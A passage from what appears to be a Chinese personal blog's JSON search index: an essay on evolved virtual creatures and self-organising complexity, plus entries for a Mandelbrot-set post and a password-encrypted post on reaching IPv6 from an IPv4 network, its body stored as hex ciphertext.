个虚拟大脑，就像你看到的这样这些大脑很笨，然后进化的力量来了，计算机自动的选择表现稍好的大脑，然后让它们产生后代，然后再选择能够做的更好的大脑，并让它们继续产生后代，下一代中能够更好的控制躯体行动的大脑，会继续得到繁殖后代的机会。 令人惊奇的是，通过 10 代的繁衍，虽然还是有一些不稳定，但这些小人确实能够行走了。 更神奇的事情是，你最终得到了一种能够正确行走的东西，但是令人感到有点害怕得到是，你却不知该它为什么能走，以及是如何行走的。 你眼睁睁看着这个大脑，却不知道它内部是如何工作的，因为这个结果是进化自动产生的结果，经过 20 代的繁衍后， 我们看到了这个， 变成了这个， 这些虚拟生物随后演化出了比行走更复杂的行为，它们产生的行为，是很难通过传统的编程方式实现的，它们对于突发事件做出了像人类一样的反应。 即使这些算法都是由我们人类编写的，但当它们一旦开始进化之后，我们就难以加以控制了，然后我们预想不到的事情就发生了。 真有一种滑稽的感觉，你创造了它们，然后它们抛开你自己做主，一种不假思索的不断尝试的进化过程，创造了这些能够行动并作出反应的虚拟生物。 我们这里看到的是一个绝妙的实验证据，来证明简单的法则具有无穷的创造力，看着计算机里面自动表演着难以用写程序的方式描述的行为，它是一个展现自我组织能力的绝好例子。 这说明了进化本身，就像我们看到的其他系统一样，是一个基于简单法则和回馈的系统，在这个系统中复杂性自发的产生了。 想想看，这个简单的法则就是，机体需要重复略有变化的行为，反馈来源于环境，这种环境选择了更适应它的行为得到生存，结果就是，在没有可以设计和规划的情况下，前所未有的复杂性就这样产生了。 有意思的事情是，一个个体可以进化到更高的一个结构状态，一旦你获得了一种包含某种行为的系统，并且这些行为可以被选择，被某种过程选择或被环境的反馈选择。所以进化过程这个达尔文学术的中心议题，在某种意义上就是图灵的反馈系统运行在多个过程之上。 尾声这就是整个事情的本质，未经过精心设计的极其简单的法则，能够无意识的创造出无比复杂的系统。 这样看来，这些计算机虚拟的生物就是自组织系统，就像贝洛索夫在他的化学实验中发现的现象一样，就像沙丘和曼德勃罗集合所呈现出的现象一样，就像我们的肺、心脏以及我们这个星球上的天气系统。 伟大的设计并不需要一个伟大的设计者，这就是宇宙所固有的本性。 令人难以接受这种观点的是，所有形状、花纹和结构的产生，并不需要一个有意识的创造者，但这种设计本身可能需要一个更聪明的设计者，他做的事情就是将整个宇宙，作为一个巨大的仿真，在这里你设定了一些初始条件，然后一切的一切都自发的产生了。 伴随着所有的惊奇，伴随着所有的美丽，图案形成的数学本质预示着同样的图案会在许许多多不同的场合出现。 如化学生物系统，在这些系统的本质里，都存在同样的数学基础，在这些内部本质的外面，就是我们看到的今天的这个世界。 我想，这是一个令人兴奋的想法，那么我们最终能从这些当中学到什么呢？ 这就是宇宙间所有的复杂性，所有的多样性，都源于一些简单而毫无目的的法则的不断繁衍的结果，但是请记住, 尽管这个过程力量无比，但他却具有固有的不可预测性，即使我可以充满信心的告诉你未来精彩无限，但我仍要负责任的告诉你，未来将会发生什么确是不为人知的。","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"chaos","slug":"chaos","permalink":"https://blog.mhuig.top/tags/chaos/"}]},{"title":"曼德勃罗集|上帝的指纹","slug":"pen/Mandelbrot","date":"2021-06-06T03:50:37.000Z","updated":"2025-09-28T09:06:00.000Z","comments":true,"path":"p/64e72a75/","link":"https://blog.mhuig.top/Mandelbrot/","permalink":"https://blog.mhuig.top/p/64e72a75/","excerpt":"","text":"曼德勃罗集","categories":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/categories/%E9%9A%8F%E7%AC%94/"}],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://blog.mhuig.top/tags/%E9%9A%8F%E7%AC%94/"},{"name":"chaos","slug":"chaos","permalink":"https://blog.mhuig.top/tags/chaos/"}]},{"title":"记一次仅在 IPv4 环境下访问 IPv6 网络的经历","slug":"web/ipv6-vpn","date":"2021-04-11T01:24:30.000Z","updated":"2021-04-11T01:24:30.000Z","comments":true,"path":"p/5e9edb45/","permalink":"https://blog.mhuig.top/p/5e9edb45/","excerpt":"有东西被加密了, 请输入密码查看.","text":"f5acefd70429a87fe5021e27622ec1128e40d1046ed1888ae7e891cb14d262dfef4eea3742a6ebb5b37f9a24966928d8534a26093596ae98a02be3eb347a7b4a0350c1abe43e99c6a0d9c654f4cf978bb34e2845c71926a86d33ee082f3cc73868d1bc1baa3e724560027cd5278b8bf2459cf3bcc441c852fe92e4689eb2c607177f354436be83aa522eafd76cf45f2a3720123e2922fbe64d9dd7ba1680fadf13e8203c95fa15fdb28a1fd449f57408ef0442ba0606f552bf8372472312aafd455f5defb1e9a56220ae298f8484e66bcd7f8b687098fbdd07cfd8048b73c0433d4b4694104d99c05ef936e7c7adc0ef7ab1076df9a626fd7bfa5377cf546c74dc8e309f54ce76e1108edaf6425e43dffdadd408eced003fd87cd28ad698d3e9cbee0f544263e62527582e22a2d29b5cc000744a9bfe62f5e5854b9d83342a4e58c8a25e4794df2fefee3341ac33fa66e4cc1a7aa009d9fd6a77d9bd1df2d45d163404030cfd4b7920ecb36e32d96e5c2aa108869451634dfbe5fc7954df8d16dbc637ad59f83169969172ae4ebd57f5c4c383fe347a79f97a3695d52db6b5eb1ed29b8cb170b1ff69fe7a9747d99e09eebc4fe2a232dfe900e1e8c90721707db78a6a92960f719abdefb1615e45e0d2f80e03ebe7732df898c03bfa3e5e257b44f4a63c017ced48b8252be554a8fb316cb3544c016e7cb792744f389256f4b8d7243c1d869634984c30dbbd37c330d43f6ea2eec8b52a453aa041f9a50a5c23f0504a18d3aed6e6b0dd15b5d9a72a38e5186651628e8783afa66bd11322235474233bf8e562ee227159f14a1b4b08a746d4c8000fa09300ceaf56971287e421a57d43beba2b0b7ce0d84cbf642acf454a55c491fcca6e96e5064c6067197d309b965ec866afb9051909a671d02b9c19648522edd92483a5b80c00885c96bc79e810ad12644646e07286ca3db98ddcce0d51d3901c6c17a64d2137bb07f6cf479312db7d2eca00226b4c8ec2790fc55591e8a7ad56fc36d95e25dc06ccab106e04db57e745bd8362ffa0dc37d831443a80c853c2e16577fcb9d9df4974726924b6ce7dab378849462358ec8296568e0409fae0f27426a85fc34f4f5d88fff2031f453b77ecb8bf5fe75c77bc818ca28d2361deab6f9d98f4dcd4c32d13e0256744b6afb357a16538acc5434705e0965163aa32be923c31b8024c490e72d5d2241816380b6321b3b493b661149a7f05a3f5244c83982d5ef27005fbeb33a1828b94d2b9cc4aac765fb3d72480db5a7d377873149ac7d382acd274cc2fbe786b7b9dbb76d668d05729defefba2e7138484a67c48c789553df68549908511d7628dbfcac77b42ea7a1a9529a0f044905dc9659ab2a1343879f17adfbb14c7551ecac60a77b679323546b12ca0678ebea5b20a565dbe899b7090ed654b204fbb6e687322a0498361ca17f9caae5d7c44f257544bc4e4b18fa60faacdc66a38bfeb3caaa857ae369ce3ee0972a343346c1026c51176e92573cea11ec1854c36d022adb5bd14df888ddaed41f0295e8c2bb4c539e63f702a28a91d2be7b3b2f9221dc6a9b6ad27b0d5e13c231c5c9a2db9ee13e8d5b124a3e514a3553544acde5a43b9faffe2c1104570aafda72e932674909d91e09fead8ca34f8666db934f2facc03707f8c76756ab563d9540854d7e70db535fa44633d4f42c5cdce6190aa6eeb967b90fd4328c33cf3e7d61fc57aff8e3fd1163caa462a429d028693f606d42e2dc4a4c3ad7b3e8f7b6f3cd62ab4eeb5524c421295ded27582e3dc0ef212b6c29580a23b6ea2fbce265ebe0f9772d36464f210d712f2c57c04a7ceb97263ba5b6ee8996a0a55025f10944910831023add9bd5eca1b815f881d6aa1b449e31c47501667ca5e92c2b1d7bda02511f23bd2f5c2af24dbf2a8fc353cbb1201ff9cdde3e26f5d897053e68f80b0a759a2c93fa51f9dae9ac5670a2f39f567cdb66e160c315f9c23074652cf851513b70e39224cf1794aaf25b88df5b887dc3f4285d92103f6dfe09a87cd6487246376546af0c8460479affe6b7fb0bc2ec9c613cb00830d10c8c7d8b7f79539c177d7947df8b16b0d41e533debde83cacdfbf774290ffe440c220c4ff622a629ebcf5012b5cbbc03a63e92fd075fc40f265d20c39eecd03ec8ebd04ade4fccb0db65c1aa31363669192f0706d4fb24b3a648140a1e193f1c3de5df67d96916e57d9d033c2e84170553cfdaed0ab5e38453f101243339d67b9c19644b88f4ae415646411dc31e2697a995b51633463e58bd2f3c17ffd3f0badd785749228bcef9367bb0f9e64d1ce7d11ae0a1df719166e6e6e78c41ee771bc4464ccb1418f431011721dc84f84aba10e67e4863b3325e8fccf2a01a0ea8b7571f1045f1c7aefb3621c9cdf4634695d99d9522f191d8cc1397a4ee985a10613e71919508f1b28084732b0c3e61094ed0884b07b1c1d45a71e337c63367588e691d4ec56afaea4c00505cf24fe7deea1fa514a25d406a3310f3891cf14215559f37ca8fa86b42382d9793e84645667fb014b2ff5bd8b45ef3e7b5a504996257f11f3854420e7fb7c4391adf63bec990226976c206cb2cf9f79fbc11778c41b7b9a5bf3cd2f5d3cb222371311ee23b5a400e73e5385c1d2a233e32027d59089d8e9cd92759ef489d2e22dab2157f98f4fc33388bca3018afc0dbd54911c98b86e718245931522b3a7e3a3808091454b37a6fcacd0cf96a02111bc6e5b21481d8ac65e244439727f1373455489712b5043fd383e82a64e7f034c7fc2ab863b3e4e9027794426ab959d1a7c79d77f2faf147dfab0b98e5c08ad57b76e96736af4f84401ea5674d992e2dd1deae1ef2cf4abdc289c792f1c39421d314d353467916cf62d3dbb91c56df51deb7c0fa74a6227466bab96564fa71a74435bd2f8b837a5a66c89cd3036fca95f9aaae4e4b41f0527490790e9b57eb1c8d87d01e02b605a3b154cee42b0db179719a4ee68475b0d7aaf9df3460646f0a184f7a453c551827a2bc695f35e1590a725d4c1f6100220a20a95b906724f74823fd74beb8bd40c4b69a35fd21c9a875b2fd2c9653e8a7dcd2fc7b54bc9f039f7dbb87770fbfd235e77f4993bd748427873a0aeb3d5f4177ba73fd049dd488e88f7f43cbd90bb5c72cf726127438bbd8dc4d0e4aac97fecf8ae03506f2b5219f8ecc3c044d2018e8b11d30b0687000e11d6bb1f2866dfeff5c51d7fd643c770155814e8e65013dd5cc2892f144eba64f2532b200113da98f49a5d264991a335792ae14bde91667c5f8c3cbe4d9e29cb3457925db6824d9176279869d1591fc89640d582f64ce7387021796f3b20367b2ab9c33a1b783035cc1b26fc1cb977933428fda2c3d4efabf5ea6de631ca245e8b185c678efc4e90694680d3c05c911e13231da44cab08e75b211cdde02c976fd59307d5032f7b1e0d06d74a434d8281ab0f16d0bf39eddd72a7071f05b4803cc8aa4f4d1fd5a96dbff8bfbbfd85dc26926ff800c2a5809b0fcba2cd96c72d9f72417adf29fd2e29dae6e20fb34738e8fb8d869bc98fbd57ab4b2bbfa06bba464e3650bd24e76b2f5bca3900db903f17b5c7b83a35db2cf696239ef2c83c16a1cab1b446b55d08476796ca34b7ab8b053bbb0e19cf1c8e9edf73e9b592ed293553e63cdd0b07cf508af9be6cb4b9ca79d0cd80ed58e021f67a9b9c0811d4f66442a2799d696dde89a2c89cc3b56d1a3db1e79a021d6dc4db2fd2977489dc16e42f9abfef08fa14182b89913bb83a57a005585ad3d73d2b3c62969d4ac43918ed4f392e87995d0dba57d55067f7f284dd0f179e301fdd6812809b7290f2c9476461b692c3da9f96b99166551fc2f0ead4c7433e1586a150dfd66b014e11fe36eee93c88961f7d009736f17fb8b97a9345e5237741d103dc31a346313ad3ddc660467e52925f55d6d678990fa320b56d8113796f9aebe6f98dfa3a8c5ba5cd7410303172f6f102f9d62d8fc171675b5ddf7a4ec8c920a2f5c7f86caa77e2243a7f27a26aef02a5f00ebb631be07f76b031e3a41c940689bb74ff326a70190492c1a2b94ada73bcb50ff728be86a44a7f653fcef3262f87ff2102a41addd7b67143b9a36ad580a34080947d6cb2a5565f58ef6050636b186dca7382a64c46a065330a686a16f4e7e12d8233e0fd26d3b2998d48211c9252e207f66fd43df58e5ba9c8c6f1ff79aa88eac1daf1a5343e79479f79eb4f9079c100e2cebc29889a3d3d69e3c453204918e293eb05997bbb27bfe5399ad6909270002f7d032bf6aeb9c3f48a69d33eab403266104f88d0b8d0aa8c8252ebe93cccccdbc48441252c57a8d789e5fdcd5a21e0720aa80914f992bf0a52d93cb206bfdc63cdab061ea5eca632e4a014ab3091e459bf9857f17a88e9c7f374d0d7f0b5e4c25038e13e77a57be5338e6237cff7731e4cbae3270e0a8c27375c184a46726287dd0cc41887d8a2955a6c04171a9ce637b548be2953e5ca039441f760a369f3adbdac19eafb15638bf9b9bc2358dbdeea738acfdd0926321faf7211db5a409bd5c1e0f072cac4720155cc7ef377344b52792a90c699a2f8ba4fadfe6f8082c564cd5424880519789602f8a74f3125a783595cba8a0934ab36ea18db8d940a82221b841b74046d077a1405c0be342ff11fd928a979e9181a0d1c33079b2459c7329e259aec5dcb5b7eb55d43f59088a16a28e80f9044192a59c73da237a0d0139251e9ab9381b15f605290cfc31a6164b5a3282fdbd0643a1d2d52084340ca388d78a5402aa290ab9b6f97fb8252c0a78e1b51316cf03d79a73590c1fa5dea573cfa4c4dfdf123c9fc678bcb9b515f5d98c5ffdedf1808450957d61afb281e739f05f6a7941b23922c951976113eca41cbe89701187858ed83cfe5699b2fd6360c4f105afcef5840b2967180dd90865eb9727029cb3b8a89b18159dd43c4a3d88ce79de43d8a2b71db7278b056d890644af22345e5a38ef5668b8088210471ca3781ed3afa35b90f8e22e842bc4d1be8c1ba9fc86c9147092439a1fb811833bbe765512f9368b4f2790e03a2ef4b69ef59e933981f565216a6c2b72923532872466eba25f670872be8090af0c222e38a80a5c936c5061a52b38e20d765fb38eee6b6195ab074e2f080e5656d55ee4c3f72e9863e41c87476097c437ae51bfd13cf45b4749bed7f9ff806934ea214493779e11c5c75c614d182fdf61c02c465858514fe28358bd6d99232e33d11f16bd75be6b1c1c56d79984662e6b1eb5f05bcb5a45722ad510671f0c5be6dfbed9fd7843d8a61fe3610c8db3e2860cb99ffe073c13710d89dc17706874897aed07fdf3be29f4eabf902b81c93d9fc72dfbcc89ab6d70b5c9d497f461cbd39a92214accefae94edf0a4ca8bde39b308b0d4fc9456a0a55b501d44b80cf1cb48cd3074f315427ec38a7ccfa2743587a71fe0b5bdb74bc72395ae26c336b573a2aba644a924668f569509c475379ed533edbcfeebb0ecbeec57fe25b49f746c207bd7d8e7285b3a1c058f36064f66a0a8b1c834a6c56793cb5b63655441413eb5c0d90f69ba72eaaeb2f280441689e8bd0e790ade10b79e2f2a127cb552928a135514d398a19d12c809c84ceea14e3a062c43c9a195b5b232220b1ec66e8346d2a8a4066ad0f43194734edd60e1d4a0d5cb9c2a2921c26d4a7d1a7feebbdd8ae9bbc44bc2625025fc1b3e9392314e6c20657ec850678dadff7d65c290f36aa3addddbfa559652f05931e7f5285ab04f97f2cc99216f298c135ca63ecaf1829998bd54e41d1c9d0d5892fd8dff58bf7a7eeb91aa8f597d7e6674640de06eed09b5326c08ed9f796cbd7289527a57948c2b48177bd61d04b84b4ca2b0ea1d6518d59d3809f7a033de58bc332362fe60889997bfcabb2c7314a184f91ee8d8f8d2633af9d049d70671c9cfe6ffd4f589b9fa10267eb23389de390a3989d4b62b03fc8249db3e15e1e017b368b331faf4e1aadb723738c3e92548d223b598354d2c672a98226ce3314d8bbf9c4063d38535c2512d021c05d32abcabdf4a10a66bc28089b23b93cdb2851eb52d161ae41d7dba61d6aef720a155ff6e8a66fd357d64cd46818772ef1424efed039cae3eed62e9a102b9718b2fa89f919dc055fa9258b275d826a3f49abc358f18b323fee392334bae4eac3eb90bcf72a43c47c1156ef7f6e8472e3021846c96076fcea61fa9351a0d4a5b0b1f490ecd15dc018137ed9f403ca871f4ab51b617049b070775c1a37cb69762b229a1588bba5239f3926b984a3b7e5f56ba7726813962d76381efde30f3702f81b91c986b46ef006ab47c9747bb688356e73e8cf2121b95684b0691327e7a398de6c86c902730a7663e72f5c55923fcb6b308eadccc088a548bba493ed2017a2f66cdecc9e0f0407bf5aec16f8182793ad503bfe0309a49e97576eafdf1b7efa42eb44562a4fd1b9fc06b042a4dd9c4055f9509df940583ee8698dc1e78fd171f00b2f145796a34edeb4b2dd80933aae485273375bdd5d908c605c529c53cc1a3ea8656e1e7a4d5c796fb1387fb77780ddaef92c0e61484f9fe0c091d4f874b7ab4d7059410bf4b0db6ea09d6409e8bf0ad384b36568d35803b90ef0db0e7352de701cb44c32294b966fa736662a05bcbc76fb773f44d211140f036f8ab134566284feb4910b52b940309bcbce21f7d00bff601349fff1a0c33ea70a4613c5f805a1cfa232364ae47c3c0e0dc7f24e9788f4463654b0ae869eed49408ed1971fa530957b71e284ac22dcce5bb614dd1eccbad3ff6699bc603162f05cc34e9f91cc55e74be1521c10ea5fa62c5d1b75e0159ceda1451bfde0264f7d4210560f46f2670c7ddf10dfe84e2fd10289583cd35895bfb9172a61f351bf82b98fc5184e998f74460596f32ffe1d826e5a91919898c392aa7fa0687705377bf63abf30eff1185de2b36cc4dc5f8ee0d4c0e709a35283c99e76d98594a4946963a88e6db772e8de35a8637b3250c528a093a2a747c1fb872f1fb3f389342f769de9558585f92bd6e51c95cf2d1fcd6f23f341a078af2f91d68b493874075cc23ea84f06b67cfe018a2f53e324a0ebc4d745e0e33f6e462c3caa7128b6bd6a719b1d6931163ce8a2c5824e9b2106b5ba5c6693a591632bed7c910132015cb5ce572875aeb7ff0c3fd7c24883c462687080246ca7a4093fd52e2dc2217b91513bddf3237c8dbff9d6d1379666b2a8d58fd7a51ff7bd513ee43312550c6b8c7575adcb03c74a7ca474bece2a91d78f64fb90987ddb55b31eff9e11c5298e38699271910cef626f8be03c437cef3b5500eeb26f976ca184a4a7a8f64ba8729d5ab97fcd7233123e9b587b27ff46deb3979a79bbbced87a92f3f13b617f009dac4f04e9f722319dfbc4714dabdda334c6c1fc11605008d6fe3bcf34ed9b51506def4334c25be58cba7fe5599dec1c5b203210396ef2a0d9dcc13c6b353033f1d7665152689058963cf906e0e97b3920d79560788f1ccde4c07ede4e9f02ce40a7f50c959908c0990ac8238bde58d06fc2ef74fc212645ae8de9272402788ac8872bf757737f74b4e58fcc9a91bf5568f038cf0093712ae36896b58e7bc81bbd1a54c96e7eea4c56f8270cff983805f89669c659fcd511e52431afb5f00d9eb55dfaa14feaacc33fd635bdaed1172cb98986285a704572a21a1a3a82421ecdb12e7fd8f7b653d39694c8c3fee410d3091f4bac3f8484827d55492f9a7deed9db3e3b778060cfd164369328e0d361a5c8323d85247cabef7206c3f0fffb40664348f8e21403dac3fdaa5f23c09eed294176453e22ac69caa159aa8245f43bd7d30e6b52b84183e25e5e2877105b0baaacd482ac343907720dc28eeb50fc421c7ad18af9df50c0cdd70bc67a23cbed0b2324a00939787deac0e1feebf3a48e21055c29b1ad05a08b2fcbbb84d0dca04649d730a3acb52c48e9ca0e40d4df493ead5000817981bb5b4f64e11b2ea66ecdf864240c3d4f5119f9a92e2b444bf6bb9fd392e6b3dd980fbba1af69729974fab67ea1da587b8cc31ccdb123df3a4e1dcbc2feb7d8f1103e25e3fd1585820e8504bfe167c2dc5fe1aa30a66a87d495ba415dc4173a652f4c4126d478221ab92d633c0542ab4d1c3e1e762f74b98f2ed01716594fae7298613cca9255acb91982e159e97374af30981e4dc78d9058f31b7b9e19c2b7b08f9293904b1b109ff225a49b4646887f191f89b39958a30bfe6751e766405d613769c7d75be5c3812767700bd9e7e68cb2731f38bff14634302ca886997dbc0a5353cf380355a43f9d6be33feb7bd001f78e0b6c491cd8da5dde18363c5a34a42816f7682a33386aecec8b8968d7bd5a419522eae0fa7f62bb8513c8d271a9c44645898ad01fa2d10b6d62cf21f2de90f0acf0a86efbc6f4bef06aee07aa0bccb3320bb64bdb2718bcbb11b5d5604614a2c3d270d84d2e7c9d98fd116f405bdf81845b705edd7710e572b1f827af5bb74ef2d3cbd6857a3239b696bd78e81956927019c743eb649f02c920fe8aa82fabe9c86a64bc3e20c157d33dccab72d5ec059e8958612af411fa047586ebae0a89ebcb434c632efcd426d6c47df73763213281481c853d3f228249408c0ff2fabe410ca44d25d02c6fa70fda8247c7c9921f9d19edee802a1d7f78f62b8eae4635dac4fd98220e819d6a71d45774900d28583e2e5800c0b991384be1a70845dea8a541ca8114afa3eba2b2e67c8855d6dd60ec2892a8efa505b0491bfddd583a20503b7b5021605361ea0c5491da4fde2c4bff6f76f6eb481e6ff579b99ee6221a807073836bfeab1d800cfc1c13f18ece760a3e129a700b1a4d6057844c6993d73af5b787cfba4096bd2d746704ed6b87ca2a74d744cfcb318065b7600578b5db18276e6f576170b34b9accc3f2c9b4f929cf20218861b25375ab139134089847d19fb9743cb7faf4d1f94e891b03686f0046d9d5c56d4c09ab699a5c1d4905d008e6e079893a8214591f22dad020227e33cb3fe621ea6787c9a48c825e3cbc87818034b7c3408fed0d83416449f89bf8accb70bd9e8fe5566669fb5c3c4acd2729c5715284da4e8b42e3c29fd597b594c96919a8d1adfacd4d104cad10cba5413e2b51c0432c792b16a8503018d221fa63547c42503c124122bca9a93010f6c463e9cdd21e6523be78dc87645fd443d095726f39521c73e9d694983a724c091d54f90f047b807db7065dbc780b83e24b10a0af1fe069f8e68e03e229456615076b827d54bad4b0a410a008db249b104b44a263a3f33a444e006c4b923efc57e1b287e0245eeabe9e247cd33f867c4ebb8cba0b1ecdc287ecf0a0e05f4b381a8d9d8589c2836f59ccfcdc98907bd8044d646052b2ef3ca42823b5130cfb440b29663f23729535526164b7bfb809b8a857f0ce04e5703007add8eb3b4ad132f2d56f82f1c7c590aab1aa8a9846d8a6fca76ebfdedf77372b8dba31f579b1613be105a2417bfea8f09b4329fd2e2da3d96f5d6ee9ddb0423abf464603105895f0e1da8587f53e86e821b9843649e88d0862883811d3518eacf2a93466b4e255d8ff4a52e40bdd2a2f7131de0f78ed62051a07eea5f3e3faad68ec370297547e2295dfcbfb3c836df452ad922358ddb600e25c73dc4f9cf09f87f33e4bffdf957a2d0f3988e75801036240db26aea32e29eaeaaa467fe81f46454e3cc2915bbe7aecb4a80cd1126db6ec8968bf7f3c32b54a85609836aac1057d37407d607a8e639a89dbc3e1aa3a47b95d7741bd0fc24e715e9867cee7e4d679f4557c8b2e51cbe9b330c7debeeb4543ee74654104597d232f72900944a9b393ca6e9a486f3d8aebf19c4d846aeaf9613cba574e229d1ac41d12afd78e7a6ae7adee45a53f97a1275e858741871395777c7dd30ee2516a42fe9ce799b6064f569dbc11d77bdf5f89480d451b45f0a43a9f41c505b1c51986e514ce072a1f2cf5551da5fc1e947c06907dca163e12abb99d3552f33c53e0235f58d73fc5585e27eb9131ccf0548f245c2c4890d516b6626713a50eea78065b62cd0366fdc0559a032899feb7593f518818100d83c45f29011b2d154e2af0055fe477ab13348650f803479b5401e811dde6dabe14ed0712e71d3e229dfad4aed41aab37a5193e45c3b00156355346be17e2293187b7df08f2070ccf82152fe20b1d8e4209cbf4ee744e03a9fdf928eed0b52ceb1d6cf192405e3c69929ae1eaef13e3ed819c7fe1248423c3e1187d2729a58b642ecd17dce17c61358e3b5f455c24e5f2f8d2b11bc77ab8a3e61ff857c97c85793200e746bf3f96aa5b59a488f5ab331080224ab2f82a4815f165fdcf6d26ccc1712731f4a9cc67b30198555301dca21dc591ac14d12bca34044e7384dbd879415d76839284b5ad7fd58d298066a155e3d94e4c43b4778c8040eedaead88df029f364ee7b27b1a4a19f6c158d86d5fa5c23b45ebbcde6e72e09cd989188645115c7a651f8371c15fc6c2403854d6e78750e3043c90a5164fafa5897b2274382145c390ec933d705da43c0defa4c25c62ac1b26735a259bdd2254bbb263c2a8eb2faad9a684f1551cd8945cd249501e79f7436cec90d77f6fafa7196dd80ec188978a531aacc9e33664510c5ca97fa6a28dd8133eda6eb2b1b16a615cae080cee365903110fdfbe8f33f97b97ab1ae9ab7df787d00dcbcdde374236edd79150a0423b00c4c8947969d490f1d07ef7f6101d2b5fd4addf4c56e5d25a956c59e7bc8ec9946b83df8af97c7f7ea16137b153c7735a9730f1de8af32a7aef49c8259d4c32914fd32aac2fa596a83aeb6989db3d5184cfa3129699c7b604e00a8c74fa5f96c77b4dfbf5c2cce703f7d7fcdf809a8021a7bda074a2dc980d53f5eecc2c543f3caf84be8bfc1a9bab913999470ab295f18bf7c15d6a49ca9bcecb4c1e327bc2caa3aadfb276894961d728d326f098565f12d915b3e14dff890d2773c3d0ca7016c08ca358d393d78c63695603da59be05d9387ac181748f7704594f5393b1049b661a6bf05086a8fcc97128f04ac8032669aa5e910979665577177231b436c0697963b3f60758cf376f74f5dada0706ef7b0408b7434d70c38ce0c3a4dd1c9bbfce88440cc3a7a3767a6e2b5b439cac7d5bc7a7f69284e28b7ac13de958459699eb93d2e4ac5ad4d1ca5d34a35097f5589bb57351a839912312bda4b9979376cb3603a198e90785991463bb688d7c6bcfd5f0e85d3f038ddd951320763762346edbb68a2cd8fbae880fbca18863af4329521bb754907772c27d84bf7a12bf0615c94b0049f8598cb7ca68eb648deb7dd977ca7676b0c4ffeaf60b1a918c1fc80cf5eca1f503326d452e51065513778bcc836b4c211c6d4d232f6e91f0d797b5e425858e337d0f9a0645bc1a5c7171f6478cb63a5f90316ac47cfb4a476ea60278e791d50a4bf37a1393fd695662be6f69e3a7b34cab626db4636b5e70f60778b91fe4b3b43ac33adaa94d7d43a116bb9f787bc3fc444e150061f571179bb9a2b641de1af52d0a44875f80917a829c76e0377528295ad7bb906e8b2ae3f0f7d3024f55a181e62af4c6b8ac89f65ad1af1ee98db7f3cca4e86f600c292f74155c98b699e1cc556b5e7bb2dc80be9a41726fd4ee6631729ae080b60a1b6ead2d2419a994ec0fcf4185110f2ea803d6c9ee06355c0c33be3d97676499c50507168b1df3aa74e894be4786dce904383eb1fd755c14fbd3c8cbec9bf98cbc3ea14b638f02d10737bc272fbdec29ebc47a7c05ce4b0b87cff3899f1da6210e780ed529c2d78f62c8ae5fe43e8e4f13b355cf2fe3be03273f9f1b7aa2e3a1d461a3623402fc3e8c6fe9c8327eba2b34008c2d77a47fe1ebe2f5838955d3108c1749db795feb8411efc4602096d1e3e636d043aef7f62b4e1c739abf51d3c031b821eb18de1cc6b1010fef3c72c78512f6b581b48edb2148116c286795bf1b10194402f5d9ef5b77b0570fc774d36aed0c946a0cc446bc6d1377d6faeefe2136ad653268f2a9e252f877c5c0dc27f99e2df849db837ca7f2e3950f92ea35de48e82dbf2f25a877f26d521df4a57a63c9691505ef2a523448b388949d484a9986ed736f6f5f34801cf6174afea6f69c10eea7589ed45cd34bbb3a3e2962d38411d2c26f4c6ead6cba5caa8c568be4e41b2bc78c1e52756434fb2349e4c1e032053e100b5533332a4cf6bc124bf3164f28a6cb43b3479e6b24bc1da90ee17a2173650a0212d7665f3055e4f40b3c6605ac397bdb2557dff1babd4882073b19d99f8468ae0f99aafd0f2fcf17a037e6552946850bab595a8bfb45e6d260c1ccdd1f7accbd5972befbc45d2cf9e1f4a2356df0764bdadde2a953229ecc92807e7e133cff7421e888c5b4879bddb34ca4a9b773661f1ac3ec0f2a024b27e676b02ec0580a63a4c75f9a9838f72f286c3fb7ee3e1c3f7cb3b2d59b1eabc1d1510457e41383cf67676b5531823ab5c1363ee844c995099749320a8179003bf853afa2a3b2c656cf996f2e9764ff64136f73a6c0f08dd50cc844a1c1964bb9a791b787af24cacb9b84241b38f3d391f4093ffa699d466abaa91877cad35dd5630e4157cc8fb763ade6620229d27aa957e1fd044569cf9ec06b57f6d3e8f1d791290dc486361e71f1b5d834ed945cdcd35c612ba078f819c24217a72dd6f892c3a9cdd6d66ceadef9832aa7b0bb01839dd85a14d5b73b00a002c7019170033b0d1b21d8b1f97f858caa5138a48a872280f174b6d59106329bdf32403524313635c2d3bbb3ba9c3ccb4ccc1694d4874b8169b9bfe15c30c2ea34538978bb3b06d5c9f41f77bf27d258ad71151e2d67502e1f32fc7bfedcde48d5b612a22518607b7341926997497c9608f0f4626f9884cf1245ab8b3c98b3ea8e66a3a7ca91d8f8a5917245edabbe8ced1b3b0bd09c0d9e37abbac120ad5271f6a1b315784165648f3dcbfe0416e61b8b4d1879ce4969df8f7f6598bdbe1166dcc6744d4adc6738dcde22be907604dacf7f71ec14d6fdfbfe7a4452a192b4feb9f2e259dc05201229504e4ac9a1efe7a71191ac2d557d593645dfd545b0d4fe7c7c84d8a8db2a1cee5f8f0034aab478ca573b15599cd39b119134b4a1b639ec72ff0ae1b0c9c7f8df04051374a6be2d6b02f5a93133b536dc09c999d39ec35ffed4473e3715bd418c81bee033898f5a015cc007eeddfbfcd6a7777e6e92a50420975a8c39d08cbe3850ed51031b12b46de949966075e743af4a5363bdf0b9a475b6ab8fa730d6010723a61238a9d7460f5806758e6e5eae6bec3e7cf4a0ab2cae10a0cba26b68c17a50d0e83afb843ba5ab208f61df78d43d362526d91daf5d1690039b089f4c346948eb262aa232092b92ee048a8388e4777719492ea69d2d4f3bd52cb0f7095b0ac028f97e12059e9bbc05e8c6e4092394cfc5237310df7d24b0ee43465104d1ebc09f9c6e185c1414406a18c547a7123d207d799596fe291e386cfa0f80f90c476c0808cb8044454c9e7f345f691f1127fb1548586cf52bbcc7f43f3e736149bf0b7d476f10efd68cc9127f968291db21942a3101ecd9d65f6f25281881ed4e21ac9e528b186fcd193a6ae6f6218ac69df2b6249d1475ed6ac6ba4f2494a72be5de08de4bcda58a893701f1e6dd389232b846bd0f955be2cd3f3e4f19350c0d956c78fae6502090668421f21545716908f4730b5d57c3e8cadbd7de03a0b2881ba86c503591cb0d8a647f37f3fac3c88e6c34e00c85d910aee05b1c4b7f24c37e360eb29020e4f74d64ee840ab96c9ec5bdf8faae11d15ff723ac440e3fa2afa22ed501facd8430a04fd35e8ac657f1138df82b79753502c5ee70b756b6d7fa221e477c9e2d169063266d1bf47e0